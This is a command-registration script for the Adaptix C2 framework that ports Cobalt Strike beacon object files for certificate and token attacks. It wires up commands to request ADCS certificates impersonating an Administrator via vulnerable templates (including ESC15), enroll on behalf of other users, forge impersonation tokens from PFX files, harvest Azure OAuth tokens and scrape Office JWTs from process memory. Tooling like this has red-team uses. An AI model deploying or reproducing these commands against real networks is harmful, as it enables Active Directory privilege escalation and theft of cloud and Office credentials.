var metadata = {
    name: "CS-CertsTokens-BOF",
    description: "Ported Cobalt Strike CS-Remote-OPs certificate/token BOFs (prefix: cs_)"
};

/// COMMANDS
//
// Original CS -> Adaptix
//   adcs_request           -> cs_adcs_request           [CA] [OPT:TEMPLATE] [OPT:SUBJECT] [OPT:ALTNAME] [OPT:ALTURL] [OPT:INSTALL] [OPT:MACHINE] [OPT:ADD_APP_POLICY] [OPT:DNS]
//                             pack "ZZZZZssss" -> wstr,wstr,wstr,wstr,wstr,short,short,short,short
//   adcs_request_on_behalf -> cs_adcs_request_on_behalf [TEMPLATE] [REQUESTER] [ENROLL_AGENT.pfx] [Download_Name]
//                             pack "ZZzb" -> wstr,wstr,cstr,bytes
//   make_token_cert        -> cs_make_token_cert        [.PFX PATH] [OPT: PFX PASSWORD]
//                             pack "bZ" -> bytes,wstr
//   get_azure_token        -> cs_get_azure_token        [CLIENT_ID] [SCOPE] [BROWSER] [OPT:HINT] [OPT:BROWSER_PATH]
//                             pack "zzizz" -> cstr,cstr,int,cstr,cstr
//   office_tokens          -> cs_office_tokens          [PID]
//                             pack "i" -> int


// ---------- cs_adcs_request ----------
var cmd_adcs_request = ax.create_command(
    "cs_adcs_request",
    "Request an enrollment certificate from an ADCS CA (and optionally install into the current context)",
    'cs_adcs_request "cert.example.org\\example-CERT-CA" vulnTemplate "CN=Administrator,CN=Users,DC=example,DC=org" "" "" 0 0 0 0'
);
cmd_adcs_request.addArgString("ca",              true,  "Certificate authority (e.g. cert.example.org\\example-CERT-CA)");
cmd_adcs_request.addArgString("template",        false, "Certificate template (default: User/Machine)");
cmd_adcs_request.addArgString("subject",         false, "Subject DN (default: current user/machine)");
cmd_adcs_request.addArgString("altname",         false, "Subject Alternative Name (default: none)");
cmd_adcs_request.addArgString("alturl",          false, "SAN URL entry (e.g. SID)");
cmd_adcs_request.addArgInt   ("install",         false, "Install the cert in current context? 0/1 (default 0)");
cmd_adcs_request.addArgInt   ("machine",         false, "Request a machine cert? 0/1 (default 0)");
cmd_adcs_request.addArgInt   ("add_app_policy",  false, "Add app policy for client auth + agent (ESC15). 0/1 (default 0)");
cmd_adcs_request.addArgInt   ("dns",             false, "SAN as DNS name? 1 = DNS, 0 = UPN (default 0)");
cmd_adcs_request.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let ca       = parsed_json["ca"];
    let template = parsed_json["template"] || "";
    let subject  = parsed_json["subject"]  || "";
    let altname  = parsed_json["altname"]  || "";
    let alturl   = parsed_json["alturl"]   || "";
    let install  = ("install"        in parsed_json) ? parseInt(parsed_json["install"])        : 0;
    let machine  = ("machine"        in parsed_json) ? parseInt(parsed_json["machine"])        : 0;
    let app_pol  = ("add_app_policy" in parsed_json) ? parseInt(parsed_json["add_app_policy"]) : 0;
    let dns      = ("dns"            in parsed_json) ? parseInt(parsed_json["dns"])            : 0;

    let bof_params = ax.bof_pack("wstr,wstr,wstr,wstr,wstr,short,short,short,short",
        [ca, template, subject, altname, alturl, install, machine, app_pol, dns]);
    let bof_path = ax.script_dir() + "_bin/adcs_request." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_adcs_request");
});


// ---------- cs_adcs_request_on_behalf ----------
var cmd_adcs_ob = ax.create_command(
    "cs_adcs_request_on_behalf",
    "Request an enrollment certificate on behalf of another user using an enrollment agent .pfx",
    'cs_adcs_request_on_behalf User "EXAMPLE\\Administrator" /tmp/enroll.pfx Admin.pfx'
);
cmd_adcs_ob.addArgString("template",      true, "Template to request on behalf of the target user");
cmd_adcs_ob.addArgString("requester",     true, "domain\\username to request on behalf of");
cmd_adcs_ob.addArgFile  ("enrollagent",   true, "Local path to the .pfx with OID_ENROLLMENT_AGENT extension");
cmd_adcs_ob.addArgString("download_name", true, "Filename the resulting PFX will be saved as by the C2");
cmd_adcs_ob.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let template  = parsed_json["template"];
    let requester = parsed_json["requester"];
    let pfx_b64   = parsed_json["enrollagent"];   // base64 (addArgFile)
    let dname     = parsed_json["download_name"];

    if (!pfx_b64 || pfx_b64.length === 0) {
        ax.console_message(id, "cs_adcs_request_on_behalf: could not read enrollment agent PFX\n", "error");
        return;
    }

    let bof_params = ax.bof_pack("wstr,wstr,cstr,bytes", [template, requester, dname, pfx_b64]);
    let bof_path = ax.script_dir() + "_bin/adcs_request_on_behalf." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_adcs_request_on_behalf");
});


// ---------- cs_make_token_cert ----------
var cmd_make_token_cert = ax.create_command(
    "cs_make_token_cert",
    "Import a .pfx into the current user store, create an impersonation token based on its Alt Name, then delete the cert.",
    'cs_make_token_cert /tmp/user.pfx "P@ssw0rd"'
);
cmd_make_token_cert.addArgFile  ("pfxfile",  true,  "Local path to the .pfx");
cmd_make_token_cert.addArgString("password", false, "Optional PFX password");
cmd_make_token_cert.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pfx_b64 = parsed_json["pfxfile"];
    let password = parsed_json["password"] || "";

    if (!pfx_b64 || pfx_b64.length === 0) {
        ax.console_message(id, "cs_make_token_cert: could not read PFX file\n", "error");
        return;
    }

    let bof_params = ax.bof_pack("bytes,wstr", [pfx_b64, password]);
    let bof_path = ax.script_dir() + "_bin/make_token_cert." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_make_token_cert");
});


// ---------- cs_get_azure_token ----------
var cmd_get_azure_token = ax.create_command(
    "cs_get_azure_token",
    "Perform an OAuth authorization-code grant against Azure via a local browser and print the returned tokens.",
    'cs_get_azure_token 1950a258-227b-4e31-a9cf-717495945fc2 "74658136-14ec-4630-ad9b-26e160ff0fc6/user_impersonation offline_access openid profile" 2 user@corp.local'
);
cmd_get_azure_token.addArgString("clientid",     true,  "Client ID (must accept http://localhost redirect)");
cmd_get_azure_token.addArgString("scope",        true,  "OAuth scopes string");
cmd_get_azure_token.addArgInt   ("browser",      true,  "0=edge, 1=chrome, 2=default, 3=other");
cmd_get_azure_token.addArgString("hint",         false, "Optional login hint (email) - required when multiple saved logins exist");
cmd_get_azure_token.addArgString("browser_path", false, "Optional full path to browser executable (use with browser=3)");
cmd_get_azure_token.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let clientid = parsed_json["clientid"];
    let scope    = parsed_json["scope"];
    let browser  = parseInt(parsed_json["browser"]);
    let hint     = parsed_json["hint"]         || "";
    let bpath    = parsed_json["browser_path"] || "";

    if (isNaN(browser) || browser < 0 || browser > 3) {
        ax.console_message(id, "cs_get_azure_token: browser must be 0..3\n", "error");
        return;
    }

    let bof_params = ax.bof_pack("cstr,cstr,int,cstr,cstr", [clientid, scope, browser, hint, bpath]);
    let bof_path = ax.script_dir() + "_bin/get_azure_token." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_get_azure_token");
});


// ---------- cs_office_tokens ----------
var cmd_office_tokens = ax.create_command(
    "cs_office_tokens",
    "Scan a target process's memory for Office JWT access tokens",
    "cs_office_tokens 1234"
);
cmd_office_tokens.addArgInt("pid", true, "Target Office/Outlook/Teams PID");
cmd_office_tokens.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid = parsed_json["pid"];
    let bof_params = ax.bof_pack("int", [pid]);
    let bof_path = ax.script_dir() + "_bin/office_tokens." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: cs_office_tokens");
});


/// REGISTER GROUP

var group_cs_certstokens = ax.create_commands_group("CS-CertsTokens-BOF", [
    cmd_adcs_request,
    cmd_adcs_ob,
    cmd_make_token_cert,
    cmd_get_azure_token,
    cmd_office_tokens
]);
ax.register_commands_group(group_cs_certstokens, ["beacon", "gopher", "kharon"], ["windows"], []);
